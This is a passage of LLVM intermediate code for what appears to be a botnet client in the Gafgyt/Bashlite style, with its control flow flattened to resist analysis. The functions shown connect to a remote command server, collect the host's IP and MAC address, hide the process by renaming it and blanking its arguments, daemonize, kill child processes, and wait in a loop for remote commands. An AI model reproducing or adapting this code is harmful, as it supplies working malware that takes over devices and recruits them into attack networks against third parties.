  %644 = call i32 @strcmp(i8* %643, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.110, i32 0, i32 0)) #10
  %645 = icmp ne i32 %644, 0
  %646 = select i1 %645, i32 1293006597, i32 -1111769928
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  store i32 1348410209, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i64, i64* %37, align 8
  %650 = load i64, i64* @numpids, align 8
  %651 = icmp ult i64 %649, %650
  %652 = select i1 %651, i32 -580121534, i32 -194849087
  store i32 %652, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  %654 = load i32*, i32** @pids, align 8
  %655 = load i64, i64* %37, align 8
  %656 = getelementptr inbounds i32, i32* %654, i64 %655
  %657 = load i32, i32* %656, align 4
  %658 = icmp ne i32 %657, 0
  %659 = select i1 %658, i32 1018754693, i32 -2063639596
  store i32 %659, i32* %switchVar
  br label %loopEnd

; <label>:660:                                    ; preds = %loopEntry
  %661 = load i32*, i32** @pids, align 8
  %662 = load i64, i64* %37, align 8
  %663 = getelementptr inbounds i32, i32* %661, i64 %662
  %664 = load i32, i32* %663, align 4
  %665 = call i32 @getpid() #2
  %666 = icmp ne i32 %664, %665
  %667 = select i1 %666, i32 1815151557, i32 -2063639596
  store i32 %667, i32* %switchVar
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  %669 = load i32*, i32** @pids, align 8
  %670 = load i64, i64* %37, align 8
  %671 = getelementptr inbounds i32, i32* %669, i64 %670
  %672 = load i32, i32* %671, align 4
  %673 = call i32 @kill(i32 %672, i32 9) #2
  %674 = load i32, i32* %36, align 4
  %675 = add nsw i32 %674, 1
  store i32 %675, i32* %36, align 4
  store i32 -2063639596, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  store i32 1363962043, i32* %switchVar
  br label %loopEnd

; <label>:677:                                    ; preds = %loopEntry
  %678 = load i64, i64* %37, align 8
  %679 = add i64 %678, 1
  store i64 %679, i64* %37, align 8
  store i32 1348410209, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i32, i32* %36, align 4
  %682 = icmp sgt i32 %681, 0
  %683 = select i1 %682, i32 957960114, i32 1803490533
  store i32 %683, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  store i32 887403360, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  store i32 887403360, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  store i32 1293006597, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i8**, i8*** %4, align 8
  %689 = getelementptr inbounds i8*, i8** %688, i64 0
  %690 = load i8*, i8** %689, align 8
  %691 = call i32 @strcmp(i8* %690, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0)) #10
  %692 = icmp ne i32 %691, 0
  %693 = select i1 %692, i32 -828258347, i32 927407855
  store i32 %693, i32* %switchVar
  br label %loopEnd

; <label>:694:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:695:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %687, %686, %685, %684, %680, %677, %676, %668, %660, %653, %648, %647, %640, %639, %634, %630, %629, %627, %619, %615, %612, %596, %595, %588, %581, %577, %570, %569, %564, %560, %559, %557, %547, %543, %540, %524, %523, %516, %509, %505, %498, %497, %489, %485, %484, %483, %479, %478, %476, %468, %464, %463, %459, %455, %452, %440, %439, %432, %428, %421, %420, %411, %407, %406, %404, %392, %388, %385, %380, %379, %374, %370, %369, %364, %342, %341, %334, %330, %323, %319, %312, %305, %298, %291, %287, %280, %279, %271, %267, %266, %264, %253, %249, %246, %241, %240, %235, %212, %211, %204, %200, %193, %186, %179, %172, %165, %158, %154, %147, %146, %145, %143, %142, %138, %136, %129, %128, %124, %117, %115, %114, %110, %108, %101, %100, %96, %85, %84, %80, %73, %70, %66, %59, %54, %47, %44, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 12902531, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 12902531, label %first
    i32 -1949901854, label %8
    i32 976585876, label %11
    i32 459772803, label %17
    i32 -2117876633, label %18
    i32 -1244720496, label %21
    i32 -1531563679, label %32
    i32 705174861, label %39
    i32 1352078472, label %47
    i32 -442277049, label %48
    i32 -256372173, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 -1949901854, i32 976585876
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 976585876, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 459772803, i32 -2117876633
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -1244720496, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -1244720496, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 443, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1531563679, i32 705174861
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 705174861, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -442277049, i32 1352078472
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -256372173, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -256372173, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -879958586, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -879958586, label %first
    i32 801759028, label %16
    i32 207608651, label %17
    i32 1515796819, label %31
    i32 1824601398, label %32
    i32 -125687306, label %39
    i32 929744829, label %40
    i32 -116263274, label %45
    i32 -1682507074, label %51
    i32 -1832974330, label %56
    i32 1530298239, label %58
    i32 -664104073, label %64
    i32 -1122357024, label %67
    i32 269888242, label %69
    i32 654235831, label %71
    i32 326300374, label %78
    i32 49380513, label %86
    i32 940401194, label %90
    i32 842468741, label %102
    i32 1266588142, label %105
    i32 2010403467, label %106
    i32 1836762652, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 801759028, i32 207608651
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1836762652, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 1515796819, i32 1824601398
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1836762652, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 -125687306, i32 929744829
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1836762652, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.113, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 -116263274, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 -1682507074, i32 654235831
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 -1832974330, i32 269888242
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 1530298239, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -664104073, i32 -1122357024
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 1530298239, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 654235831, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 -116263274, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 326300374, i32 2010403467
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 49380513, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 940401194, i32 1266588142
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 842468741, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 49380513, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 2010403467, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 1836762652, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.117, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.116, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i64 @time(i64* null) #2
  %41 = call i32 @getpid() #2
  %42 = sext i32 %41 to i64
  %43 = xor i64 %40, %42
  %44 = trunc i64 %43 to i32
  call void @srand(i32 %44) #2
  %45 = call i64 @time(i64* null) #2
  %46 = call i32 @getpid() #2
  %47 = sext i32 %46 to i64
  %48 = xor i64 %45, %47
  %49 = trunc i64 %48 to i32
  call void @init_rand(i32 %49)
  %50 = call i32 @getOurIP()
  %51 = call i32 @fork() #2
  store i32 %51, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 -2085390472, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2085390472, label %first
    i32 -1237995150, label %54
    i32 850088229, label %57
    i32 1906634908, label %61
    i32 -955310339, label %65
    i32 1424730068, label %66
    i32 -1138453358, label %70
    i32 1465298796, label %71
    i32 -1181111582, label %73
    i32 807747266, label %74
    i32 964142055, label %75
    i32 766407110, label %77
    i32 -22100013, label %78
    i32 627580243, label %82
    i32 1036817507, label %86
    i32 1826982680, label %88
    i32 -1327040798, label %92
    i32 630223397, label %98
    i32 -906259887, label %99
    i32 921204724, label %105
    i32 1514981824, label %114
    i32 21404956, label %117
    i32 1332248487, label %123
    i32 1710382929, label %134
    i32 -1913098621, label %137
    i32 -554891159, label %150
    i32 -41531540, label %156
    i32 355709196, label %166
    i32 218359516, label %169
    i32 -515011511, label %173
    i32 291672753, label %174
    i32 1680284056, label %177
    i32 -2097483566, label %187
    i32 664845129, label %190
    i32 -1345243617, label %196
    i32 -342134288, label %197
    i32 1683235520, label %204
    i32 1977123322, label %207
    i32 9971107, label %213
    i32 1483936363, label %218
    i32 520969800, label %220
    i32 -1948805710, label %223
    i32 1261818293, label %229
    i32 665503327, label %230
    i32 -272992040, label %239
    i32 734969787, label %249
    i32 266006739, label %258
    i32 -1530050047, label %260
    i32 346104963, label %266
    i32 -669025417, label %268
    i32 -1516067713, label %274
    i32 -1420817286, label %279
    i32 1729263994, label %281
    i32 -1324379515, label %284
    i32 -1565153823, label %289
    i32 -1741332621, label %294
    i32 432835933, label %303
    i32 489148780, label %308
    i32 874750669, label %312
    i32 1439908448, label %313
    i32 -2045394624, label %320
    i32 100691880, label %326
    i32 -1048168082, label %330
    i32 5203456, label %333
    i32 1272353848, label %338
    i32 -658861114, label %342
    i32 1393862254, label %348
    i32 1984810590, label %371
    i32 -1663315260, label %373
    i32 -1301145199, label %379
    i32 1237657712, label %380
    i32 1465156894, label %385
    i32 -1753277369, label %390
    i32 1390530810, label %393
    i32 817426421, label %394
    i32 -1526787958, label %395
    i32 576579175, label %396
    i32 -879277376, label %397
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %52 = icmp ne i32 %.reload, 0
  %53 = select i1 %52, i32 -1237995150, i32 850088229
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @waitpid(i32 %55, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %7, align 4
  %59 = icmp ne i32 %58, 0
  %60 = select i1 %59, i32 964142055, i32 1906634908
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @fork() #2
  store i32 %62, i32* %8, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -955310339, i32 1424730068
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %8, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 1465298796, i32 -1138453358
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 -1181111582, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1181111582, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  store i32 807747266, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 766407110, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0))
  store i32 766407110, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -22100013, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = call i32 @setsid() #2
  %80 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.119, i32 0, i32 0)) #2
  %81 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 627580243, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = call i32 @initConnection()
  %84 = icmp ne i32 %83, 0
  %85 = select i1 %84, i32 1036817507, i32 1826982680
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = call i32 @sleep(i32 5)
  store i32 627580243, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = call i8* @getBuild()
  %91 = call i32 (i32, i8*, ...) @sockprintf(i32 %89, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.120, i32 0, i32 0), i8* %90)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 -1327040798, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %95 = call i32 @recvLine(i32 %93, i8* %94, i32 4096)
  store i32 %95, i32* %11, align 4
  %96 = icmp ne i32 %95, -1
  %97 = select i1 %96, i32 630223397, i32 576579175
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -906259887, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = load i64, i64* @numpids, align 8
  %103 = icmp ult i64 %101, %102
  %104 = select i1 %103, i32 921204724, i32 1680284056
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32*, i32** @pids, align 8
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i32, i32* %106, i64 %108
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @waitpid(i32 %110, i32* null, i32 1)
  %112 = icmp sgt i32 %111, 0
  %113 = select i1 %112, i32 1514981824, i32 -515011511
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %12, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %14, align 4
  store i32 21404956, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %14, align 4
  %119 = zext i32 %118 to i64
  %120 = load i64, i64* @numpids, align 8
  %121 = icmp ult i64 %119, %120
  %122 = select i1 %121, i32 1332248487, i32 -1913098621
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32*, i32** @pids, align 8
  %125 = load i32, i32* %14, align 4
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  %128 = load i32, i32* %127, align 4
  %129 = load i32*, i32** @pids, align 8
  %130 = load i32, i32* %14, align 4
  %131 = sub i32 %130, 1
  %132 = zext i32 %131 to i64
  %133 = getelementptr inbounds i32, i32* %129, i64 %132
  store i32 %128, i32* %133, align 4
  store i32 1710382929, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* %14, align 4
  %136 = add i32 %135, 1
  store i32 %136, i32* %14, align 4
  store i32 21404956, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32*, i32** @pids, align 8
  %139 = load i32, i32* %14, align 4
  %140 = sub i32 %139, 1
